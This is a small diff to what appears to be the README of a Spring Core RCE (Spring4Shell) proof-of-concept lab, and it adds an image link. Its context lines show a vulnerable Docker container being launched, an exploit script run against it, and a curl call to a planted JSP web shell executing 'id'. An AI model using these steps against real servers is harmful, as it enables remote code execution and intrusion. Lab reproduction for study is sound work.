@@ -4,7 +4,7 @@ docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03
 python3 ./exp.py --url http://192.168.0.11:8082
 
 curl --output - "http://192.168.0.11:8082/tomcatwar.jsp?pwd=j&cmd=id"
-
+![vulnerable code + poc](images/exploit.jpg)
 
 # Spring Core RCE
 
